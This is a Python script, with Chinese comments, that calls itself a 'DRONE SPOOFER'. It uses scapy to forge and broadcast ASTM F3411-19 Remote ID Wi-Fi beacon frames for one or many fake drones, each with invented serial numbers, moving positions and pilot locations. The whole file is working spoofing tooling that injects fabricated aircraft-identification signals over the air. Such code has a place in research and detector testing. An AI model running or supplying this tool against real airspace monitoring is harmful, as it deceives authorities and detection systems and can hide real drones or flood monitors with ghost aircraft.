import random
from datetime import datetime, timedelta
import scapy.layers.dot11 as scapy
from scapy.config import conf
import math

# 地球平均半径，单位：米
EARTH_RADIUS = 6371000

# 定义默认的纬度和经度
DEFAULT_LAT: int = 319444234  
DEFAULT_LNG: int = 1187983702 

# 目标地址，设置为广播地址
dest_addr = 'ff:ff:ff:ff:ff:ff'  # address 1
# 源地址
src_addr = '90:3a:e6:5b:c8:a8'  # address 2

# IE: SSID
# 模拟无人机的 SSID 名称
drone_ssid = 'AnafiThermal-Spoofed'
# 创建一个 Dot11Elt 对象，用于表示 SSID 信息元素
ie_ssid = scapy.Dot11Elt(ID='SSID', len=len(drone_ssid), info=drone_ssid)

# 从 Parrot Anafi Thermal 捕获的头部信息
header = b'\x0d\x5d\xf0\x19\x04'  # oui: fa:0b:bc (ASD-STAN)
# 消息类型 5 的数据
msg_type_5 = b'\x50\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'


def get_random_serial_number() -> bytes:
    """
    生成一个随机的（但不是唯一的）无人机序列号。

    Returns:
        bytes: 随机生成的序列号的字节表示。
    """
    integer_val = random.randint(1, 99999)
    serial_byte = "Spoofed_Serial_" + str(integer_val)
    return serial_byte.encode()


def get_random_pilot_location(lat_: int, lng_: int) -> tuple[int, int]:
    """
    根据无人机的起始位置，计算一个随机的飞行员位置。
    飞行员位置在无人机起始位置的一定范围内随机生成。飞行员位置并不重要，只需要无人机的位置

    Args:
        lat_ (int): 无人机的纬度。
        lng_ (int): 无人机的经度。

    Returns:
        tuple[int, int]: 飞行员的位置（纬度, 经度）元组。
    """
    return lat_ + random.randint(-10000, 10000), lng_ + random.randint(-10000, 10000)


def transform_rotation(rot: int) -> tuple[int, int]:
    """
    转换无人机的旋转角度值，以便按照 ASTM F3411 - 19 规定进行传输。
    传输的值必须在 0 到 179 之间。根据原始旋转角度值是否大于 180，附加一个 32 或 34 的值。
    附加的值用于设置 E/W 方向段位。

    Args:
        rot (int): 无人机的旋转角度，取值范围为 0 到 359 度。

    Returns:
        tuple[int, int]: 转换后的旋转角度值，用于设置 E/W 方向段位的值。
    """
    if rot < 0 or rot > 359:
        return 0, 32
    elif rot < 90:
        return rot, 32
    elif rot < 180:
        return rot, 32
    elif rot < 270:
        return rot - 180, 34
    return rot - 180, 34


def create_packet(lat_: int, lng_: int, z: int, vx: float, vy: float, vz: float, serial: bytes,
                  pilot_loc: tuple[int, int], rotation: int = 0) -> scapy.RadioTap:
    """
    根据 ASTM F3411 - 19 标准规范，创建消息类型 0、1 和 4，并组成一个完整的 Wi-Fi 信标帧，
    该信标帧包含消息类型 0、1、4 和 5 的信息，同时加入 xyz 方向速度。

    Args:
        lat_ (int): 无人机的纬度。
        lng_ (int): 无人机的经度。
        z (int): 无人机的高度。
        vx (float): x 方向速度。
        vy (float): y 方向速度。
        vz (float): z 方向速度。
        serial (bytes): 无人机的序列号的字节表示。
        pilot_loc (tuple[int, int]): 无人机飞行员的位置（纬度, 经度）元组。
        rotation (int): 无人机的旋转角度（0 - 359°），默认值为 0。

    Returns:
        scapy.RadioTap: 包含远程识别信息的 Wi-Fi 信标帧。
    """
    import struct
    serial_byte = struct.pack("<20s", serial)
    msg_type_0 = b''.join([b'\x00\x12', serial_byte, b'\x00\x00\x00'])

    direction, ew_dir = transform_rotation(rotation)
    ew_dir_byte = struct.pack("<B", ew_dir)
    direction_byte = struct.pack("<B", direction)
    lat_byte = struct.pack("<i", lat_)
    lng_byte = struct.pack("<i", lng_)
    z_byte = struct.pack("<i", z)
    vx_byte = struct.pack("<f", vx)
    vy_byte = struct.pack("<f", vy)
    vz_byte = struct.pack("<f", vz)
    now = datetime.now()
    tenth_seconds_byte = struct.pack("<H", now.minute * 600 + now.second * 10)
    msg_type_1 = b''.join(
        [b'\x10', ew_dir_byte, direction_byte, b'\x00\x00', lat_byte, lng_byte, z_byte, vx_byte, vy_byte, vz_byte,
         b'\x00\x00\x00\x00\xd0\x07\x00\x00', tenth_seconds_byte, b'\x00\x00'])

    pilot_lat_byte = struct.pack("<i", pilot_loc[0])
    pilot_lng_byte = struct.pack("<i", pilot_loc[1])
    msg_type_4 = b''.join([b'\x40\x05', pilot_lat_byte, pilot_lng_byte,
                           b'\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x00\x00\x00\x00'])

    vendor_spec_data = b''.join([header, msg_type_0, msg_type_1, msg_type_4, msg_type_5])
    ie_vendor_parrot = scapy.Dot11EltVendorSpecific(ID=221, len=len(vendor_spec_data), oui=16387004,
                                                    info=vendor_spec_data)

    return scapy.RadioTap() / scapy.Dot11(type=0, subtype=8, addr1=dest_addr, addr2=src_addr,
                                          addr3=src_addr) / scapy.Dot11Beacon() / ie_ssid / ie_vendor_parrot

def update_speed(vx, vy, vz, dt):
    vx = random.uniform(-100, 100)
    vy = random.uniform(-100, 100)
    vz = random.uniform(-10, 10)
    return vx, vy, vz

def update_position(lat, lng, z, vx, vy, vz, dt):
    """
    根据速度和时间间隔更新无人机的位置，考虑单位换算。

    Args:
        lat (int): 当前纬度，单位：度 * 10**7
        lng (int): 当前经度，单位：度 * 10**7
        z (int): 当前高度，单位：米
        vx (float): x 方向速度，单位：米/秒
        vy (float): y 方向速度，单位：米/秒
        vz (float): z 方向速度，单位：米/秒
        dt (float): 时间间隔，单位：秒

    Returns:
        tuple[int, int, int]: 更新后的位置 (纬度, 经度, 高度)，单位：度 * 10**7, 度 * 10**7, 米
    """
    # 将纬度转换为弧度
    lat_rad = math.radians(lat / 1e7)
    # 计算纬度方向上一度的距离，单位：米
    deg_lat_distance = (2 * math.pi * EARTH_RADIUS) / 360
    # 计算经度方向上一度的距离，单位：米
    deg_lng_distance = (2 * math.pi * EARTH_RADIUS * math.cos(lat_rad)) / 360

    # 计算纬度方向的位移，单位：度
    lat_displacement = (vy * dt) / deg_lat_distance
    # 计算经度方向的位移，单位：度
    lng_displacement = (vx * dt) / deg_lng_distance
    # 计算高度方向的位移，单位：米
    z_displacement = vz * dt

    # 更新纬度，单位：度 * 10**7
    new_lat = lat + int(lat_displacement * 1e7)
    # 更新经度，单位：度 * 10**7
    new_lng = lng + int(lng_displacement * 1e7)
    # 更新高度，单位：米
    new_z = z + int(z_displacement)

    return new_lat, new_lng, new_z


def spoof_single_drone(interface, interval, lat, lng, z=0):
    """
    模拟单个无人机，定期发送包含该无人机信息的 Wi-Fi 信标帧。

    Args:
        interface (str): 网络接口名称。
        interval (float): 发送数据包的时间间隔。
        lat (int): 起始纬度。
        lng (int): 起始经度。
        z (int): 起始高度，默认为 0。
    """
    serial = get_random_serial_number()
    pilot_loc = get_random_pilot_location(lat, lng)
    vx = random.uniform(-100, 100)
    vy = random.uniform(-100, 100)
    vz = random.uniform(-10, 10)

    try:
        send_next = datetime.now() + timedelta(seconds=interval)
        s = conf.L2socket(iface=interface)
        counter = 0
        while True:
            if send_next < datetime.now():
                dt = (datetime.now() - (send_next - timedelta(seconds=interval))).total_seconds()
                lat, lng, z = update_position(lat, lng, z, vx, vy, vz, dt)
                vx, vy, vz = update_speed(vx, vy, vz, dt)
                packet = create_packet(lat, lng, z, vx, vy, vz, serial, pilot_loc)
                s.send(packet)
                print(f"无人机信息 - 纬度: {lat}, 经度: {lng}, 高度: {z}, Vx: {vx:.2f}, Vy: {vy:.2f}, Vz: {vz:.2f}")
                print(f"飞行员位置 - 纬度: {pilot_loc[0]}, 经度: {pilot_loc[1]}")
                print(f"方向角: {transform_rotation(0)[0]}, E/W 方向段位: {transform_rotation(0)[1]}")
                print(f"序列号: {serial.decode()}")
                counter += 1
                print("Packets sent: %i " % counter)
                send_next = datetime.now() + timedelta(seconds=interval)
        s.close()
    except KeyboardInterrupt:
        s.close()
        print("Script interrupted. Shutting down..")


def spoof_multiple_drones(interface, n_drones, interval, lat, lng, z=0):
    """
    定期（默认每 3 秒）发送符合 ASTM F3411 - 19 标准规范的 Wi-Fi 信标帧（静态信息），
    直到脚本被中断。无人机的位置随机变化。可以通过命令行参数指定要模拟的无人机数量，默认值为 1。

    Args:
        interface (str): 网络接口名称。
        n_drones (int): 要模拟的无人机数量。
        interval (float): 发送数据包的时间间隔。
        lat (int): 起始纬度。
        lng (int): 起始经度。
        z (int): 起始高度，默认为 0。
    """
    step = 10000

    drone_list = []
    send_next = datetime.now() + timedelta(seconds=interval)

    for i in range(n_drones):
        serial = get_random_serial_number()
        pilot_loc = get_random_pilot_location(lat, lng)
        vx = random.uniform(-100, 100)
        vy = random.uniform(-100, 100)
        vz = random.uniform(-10, 10)
        drone_list.append((serial, pilot_loc, lat, lng, z, vx, vy, vz))

    try:
        packet_list = []
        for i, tup in enumerate(drone_list):
            serial_i, pilot_loc_i, lat_prev, lng_prev, z_prev, vx_i, vy_i, vz_i = tup
            packet = create_packet(lat_prev, lng_prev, z_prev, vx_i, vy_i, vz_i, serial_i, pilot_loc_i)
            packet_list.append(packet)

        s = conf.L2socket(iface=interface)
        counter = 0
        while True:
            if send_next < datetime.now():
                dt = (datetime.now() - (send_next - timedelta(seconds=interval))).total_seconds()
                for i, tup in enumerate(drone_list):
                    serial_i, pilot_loc_i, lat_prev, lng_prev, z_prev, vx_i, vy_i, vz_i = tup
                    lat_i, lng_i, z_i = update_position(lat_prev, lng_prev, z_prev, vx_i, vy_i, vz_i, dt)
                    vx_i, vy_i, vz_i = update_speed(vx_i, vy_i, vz_i, dt)
                    drone_list[i] = (serial_i, pilot_loc_i, lat_i, lng_i, z_i, vx_i, vy_i, vz_i)
                    packet = create_packet(lat_i, lng_i, z_i, vx_i, vy_i, vz_i, serial_i, pilot_loc_i)
                    packet_list[i] = packet
                    s.send(packet)
                    print(f"无人机 {i + 1} 信息 - 纬度: {lat_i}, 经度: {lng_i}, 高度: {z_i}, Vx: {vx_i:.2f}, Vy: {vy_i:.2f}, Vz: {vz_i:.2f}")
                    print(f"飞行员 {i + 1} 位置 - 纬度: {pilot_loc_i[0]}, 经度: {pilot_loc_i[1]}")
                    print(f"方向角: {transform_rotation(0)[0]}, E/W 方向段位: {transform_rotation(0)[1]}")
                    print(f"序列号: {serial_i.decode()}")
                    counter += 1
                print("Packets sent: %i " % counter)
                send_next = datetime.now() + timedelta(seconds=interval)
        s.close()
    except KeyboardInterrupt:
        s.close()
        print("Script interrupted. Shutting down..")


def main():
    """
    主函数，程序的入口点。
    获取用户输入，设置网络接口和起始位置，根据用户选择执行单个或多个无人机模拟模式。
    """
    print("########## STARTING DRONE SPOOFER ##########")

    # 获取用户输入
    interface = input("请输入网络接口名称（例如 wlan1）：")
    interval = float(input("请输入发送数据包的时间间隔（秒）："))
    use_default_location = input("是否使用默认位置？(y/n)：").lower()
    if use_default_location == 'y':
        lat, lng = DEFAULT_LAT, DEFAULT_LNG
    else:
        lat = int(float(input("请输入起始纬度：")) * 10 ** 7)
        lng = int(float(input("请输入起始经度：")) * 10 ** 7)
    z = int(input("请输入起始高度："))

    print(f"Setting interface to: {interface}")
    print(f"Setting location to {lat}, {lng}, {z}.")

    mode = input("请选择模拟模式：(1: 单个无人机, 2: 多个无人机)：")
    if mode == '1':
        spoof_single_drone(interface, interval, lat, lng, z)
    elif mode == '2':
        n_drones = int(input("请输入要模拟的无人机数量："))
        spoof_multiple_drones(interface, n_drones, interval, lat, lng, z)
    else:
        print("无效的模拟模式选择，请重新运行脚本并输入正确的模式。")


if __name__ == '__main__':
    main()
    